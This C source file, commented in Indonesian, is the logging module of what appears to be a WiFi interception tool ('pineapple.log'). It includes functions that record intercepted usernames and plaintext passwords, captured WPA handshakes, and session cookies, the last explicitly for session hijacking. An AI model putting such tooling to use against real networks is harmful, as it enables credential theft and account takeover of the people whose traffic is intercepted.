// ============================================================================
// IMPLEMENTASI: utils/logger.c — Mesin Pencatat Berkas & Layar Bersih
// ============================================================================
#include "logger.h"
#include "utils.h"
#include <stdio.h>       // fopen, fprintf, vfprintf, fflush, fclose
#include <stdarg.h>      // va_list, va_start, va_end untuk format dinamis
#include <time.h>        // time()
#include <pthread.h>     // pthread_mutex_t untuk keamanan multi-thread

// Variabel Privat Modul
static FILE *g_log_file = NULL;
static log_level_t g_min_level = LOG_INFO;
static pthread_mutex_t g_log_mutex = PTHREAD_MUTEX_INITIALIZER; // Melindungi penulisan serentak
static const char *level_names[] = {"DEBUG", "INFO", "WARN", "ERROR", "ALERT"};

/*
 * === FUNGSI: logger_init() ===
 * Tujuan   : Membuka berkas log teks di disk dalam mode append (tambah)
 * Analogi  : Membuka buku agenda detektif baru untuk mencatat barang bukti
 * Parameter: const char *path (Jalur lokasi berkas, misal: "pineapple.log")
 * Return   : 0 jika sukses membuka berkas, -1 jika gagal
 */
int logger_init(const char *path) {
    pthread_mutex_lock(&g_log_mutex);
    if (g_log_file) fclose(g_log_file); // Tutup berkas lama jika sudah terbuka
    g_log_file = fopen(path, "a");      // Buka mode append agar catatan lama tidak terhapus
    pthread_mutex_unlock(&g_log_mutex);
    return g_log_file ? 0 : -1;
}

/*
 * === FUNGSI: logger_close() ===
 * Tujuan   : Menutup berkas log dan melepaskan sumber daya file descriptor
 * Analogi  : Mengunci dan menyimpan buku agenda ke dalam brankas
 * Parameter: void
 * Return   : void
 */
void logger_close(void) {
    pthread_mutex_lock(&g_log_mutex);
    if (g_log_file) { 
        fclose(g_log_file); 
        g_log_file = NULL; 
    }
    pthread_mutex_unlock(&g_log_mutex);
}

/*
 * === FUNGSI: log_event() ===
 * Tujuan   : Mencatat pesan peristiwa terformat ke layar terminal dan berkas log
 * Analogi  : Menyuarakan pengumuman darurat lewat mikrofon sekaligus mencatatnya di buku piket
 * Parameter:
 *   - log_level_t level : Tingkat kepentingan log (DEBUG s/d ALERT)
 *   - const char *fmt   : Format string ala printf
 *   - ...               : Argumen variabel pendukung
 * Return   : void
 */
void log_event(log_level_t level, const char *fmt, ...) {
    // Abaikan jika tingkat urgensi pesan lebih rendah dari batas konfigurasi minimal
    if (level < g_min_level) return;

    pthread_mutex_lock(&g_log_mutex); // Kunci mutex agar output antar-thread tidak bertabrakan

    time_t now = time(NULL);
    char ts[64];
    format_timestamp(now, ts, sizeof(ts)); // Format stempel waktu manusiawi

    // 1. Tampilkan ke layar terminal
    printf("[%s] [%s] ", ts, level_names[level]);
    va_list ap; 
    va_start(ap, fmt); 
    vprintf(fmt, ap); 
    va_end(ap);
    printf("\n");

    // 2. Tulis ke berkas log jika file aktif, lalu siram buffer (fflush)
    if (g_log_file) {
        fprintf(g_log_file, "[%s] [%s] ", ts, level_names[level]);
        va_start(ap, fmt); 
        vfprintf(g_log_file, fmt, ap); 
        va_end(ap);
        fprintf(g_log_file, "\n"); 
        fflush(g_log_file); // Pastikan langsung tergores ke disk magnetik
    }

    pthread_mutex_unlock(&g_log_mutex); // Lepaskan kunci mutex
}

/*
 * === FUNGSI: log_credential() ===
 * Tujuan   : Mencatat akun pengguna (username/password) yang berhasil disadap
 * Analogi  : Memasukkan amplop surat rahasia berharga ke dalam arsip bukti perkara
 * Parameter: const credential_t *cred (Struktur data kredensial)
 * Return   : void
 */
void log_credential(const credential_t *cred) {
    log_event(LOG_ALERT, "🔑 KREDENSIAL TERTANGKAP! Host: %s | User: %s | Pass: %s",
              cred->host, cred->username, cred->password);
}

/*
 * === FUNGSI: log_handshake() ===
 * Tujuan   : Mencatat keberhasilan penyadapan 4-Way Handshake WPA/WPA2
 * Analogi  : Mendokumentasikan rekaman kunci gembok digital yang sedang ditukar korban
 * Parameter: const handshake_t *hs (Struktur data handshake)
 * Return   : void
 */
void log_handshake(const handshake_t *hs) {
    char bssid_str[18], client_str[18];
    format_mac(hs->bssid, bssid_str);
    format_mac(hs->client, client_str);
    log_event(LOG_ALERT, "🤝 HANDSHAKE WPA TERTANGKAP! AP: %s | Client: %s | Msg: #%d (%d bytes)",
              bssid_str, client_str, hs->msg_num, hs->eapol_len);
}

/*
 * === FUNGSI: log_cookie() ===
 * Tujuan   : Mencatat session cookie HTTP untuk pembajakan akun (Session Hijacking)
 * Analogi  : Memfotokopi kartu akses VIP hotel korban
 * Parameter: const session_cookie_t *cookie (Struktur data cookie)
 * Return   : void
 */
void log_cookie(const session_cookie_t *cookie) {
    log_event(LOG_ALERT, "🍪 COOKIE SESI TERTANGKAP! Domain: %s | Nama: %s | Nilai: %.32s...",
              cookie->domain, cookie->name, cookie->value);
}
